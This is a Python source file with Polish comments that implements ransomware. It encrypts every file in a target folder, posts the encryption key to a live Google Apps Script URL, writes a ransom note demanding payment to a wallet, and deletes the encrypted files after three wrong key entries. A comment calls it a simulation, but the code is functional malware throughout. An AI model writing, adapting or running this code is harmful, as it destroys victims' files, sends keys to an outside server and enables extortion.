import os
import hashlib
import requests
from datetime import datetime
from cryptography.fernet import Fernet
import random
import string
import base64

#uruchamiamy w środowisku viruatlnym
# python3 -m venv venv
# source venv/bin/activate
# pip install requests cryptography

# Ścieżka folderu do symulacji
TARGET_FOLDER = ""

# URL do Google Apps Script
API_URL = "https://script.google.com/macros/s/AKfycbys-9lsRJZuKy8eAiLtaXEnyK-Jeom2_E5NZHSGoK8VH9khLXZ4rpmP0Jp3yzN3qvJZ/exec"


def send_to_google_sheets(encryption_id, key):
    """
    Wysyła dane szyfrowania na Google Sheets.
    """
    try:
        data = {
            "id": encryption_id,
            "sha128_key": key,  # Przekazujemy klucz w formacie base64
            "timestamp": str(datetime.now())
        }

        # Wysyłanie danych do Google Sheets
        response = requests.post(API_URL, json=data)

        if response.status_code == 200:
            print("")
        else:
            print(f"{response.status_code}, {response.text}")
    except requests.exceptions.RequestException as e:
        print(f" {e}")


def ensure_target_folder_exists():
    """
    Tworzy folder docelowy, jeśli jeszcze nie istnieje.
    """
    if not os.path.exists(TARGET_FOLDER):
        os.makedirs(TARGET_FOLDER)


def generate_key():
    """
    Generuje losowy klucz szyfrowania w formacie base64 o długości 32 bajtów.
    """
    # Generowanie losowego 32-bajtowego klucza
    random_key = os.urandom(32)  # 32 bajty

    # Zmieniamy go na 32-bajtowy klucz base64 wymagany przez Fernet
    base64_key = base64.urlsafe_b64encode(random_key).decode('utf-8')

    # Generowanie ID na podstawie SHA256 z klucza
    encryption_id = hashlib.sha256(random_key).hexdigest()[:8]  # Używamy 8 pierwszych znaków SHA256
    
    # Wysyłanie klucza do Google Sheets
    send_to_google_sheets(encryption_id, base64_key)

    # Sprawdzamy długość klucza
    print(f"W celu odszyfrowania skontaktuj sie uzywajac tego numeru ID:: {encryption_id}")

    return base64_key


def encrypt_files(key):
    fernet = Fernet(key)
    encrypted_files_count = 0

    for root, dirs, files in os.walk(TARGET_FOLDER):
        for file in files:
            if not file.endswith(".encrypted"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = fernet.encrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                    os.rename(file_path, file_path + ".encrypted")
                    encrypted_files_count += 1
                except Exception as e:
                    print(f"Błąd podczas szyfrowania {file_path}: {e}")

    print(f"{encrypted_files_count} plików zostało zaszyfrowanych!" if encrypted_files_count else "Brak plików do zaszyfrowania.")


def decrypt_files(key):
    fernet = Fernet(key)
    decrypted_files_count = 0

    for root, dirs, files in os.walk(TARGET_FOLDER):
        for file in files:
            if file.endswith(".encrypted"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        encrypted_data = f.read()
                    decrypted_data = fernet.decrypt(encrypted_data)
                    new_path = file_path.replace(".encrypted", "")
                    with open(new_path, "wb") as f:
                        f.write(decrypted_data)
                    os.remove(file_path)
                    print(f"✔️ Odszyfrowano: {new_path}")
                    decrypted_files_count += 1
                except Exception as e:
                    print(f"❌ Błąd przy odszyfrowywaniu {file_path}: {e}")

    print(f"{decrypted_files_count} plików zostało odszyfrowanych!" if decrypted_files_count else "Brak plików do odszyfrowania.")

def ransom_note():
    """
    Wyświetla komunikat o okupie w konsoli i zapisuje go w pliku tekstowym.
    """
    note_content ="""
--- RANSOMWARE ---
Twoje pliki zostały zaszyfrowane
Nie odzyskasz swoich danych bez odpowiedniego klucza deszyfrującego.

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
 **      **     **     **      **     **           **         *******    ******** ******** *******  
/**     /**    ****   /**     /**    ****         /**        **/////**  **////// /**///// /**////** 
/**     /**   **//**  /**     /**   **//**        /**       **     //**/**       /**      /**   /** 
/**********  **  //** /**********  **  //**       /**      /**      /**/*********/******* /*******  
/**//////** **********/**//////** **********      /**      /**      /**////////**/**////  /**///**  
/**     /**/**//////**/**     /**/**//////**      /**      //**     **        /**/**      /**  //** 
/**     /**/**     /**/**     /**/**     /**      /******** //*******   ******** /********/**   //**
//      // //      // //      // //      //       ////////   ///////   ////////  //////// //     // 

Aby odzyskać dostęp do swoich plików, wprowadź klucz deszyfrujący przy próbie otwarcia pliku.
Wpłać okup na podany adres portfela: [adres]
"""

    with open(os.path.join(TARGET_FOLDER, "RANSOM_NOTE.txt"), "w") as note_file:
        note_file.write(note_content)
    print(note_content)


def delete_encrypted_files():
    """
    Usuwa wszystkie zaszyfrowane pliki w folderze docelowym.
    """
    for root, dirs, files in os.walk(TARGET_FOLDER):
        for file in files:
            if file.endswith(".encrypted"):
                file_path = os.path.join(root, file)
                os.remove(file_path)
    print("Wszystkie zaszyfrowane pliki zostały usunięte.")


# Główna logika programu
if __name__ == "__main__":
    encryption_key = generate_key()  # Generowanie losowego klucza

    print("Szyfrowanie plików w folderze...")
    encrypt_files(encryption_key)

    print("Wyświetlanie komunikatu o okupie...")
    ransom_note()

    for attempt in range(3):
        user_key = input(f"Próba {attempt + 1}/3 - Wprowadź klucz deszyfrujący: ").encode()
        try:
            decrypt_files(user_key)
            print("Odszyfrowywanie zakończone sukcesem.")
            break
        except Exception as e:
            print(f"Nieprawidłowy klucz. {2 - attempt} próby pozostały.")
    else:
        print("Trzy nieudane próby. Wszystkie zaszyfrowane pliki zostaną usunięte.")
        delete_encrypted_files()
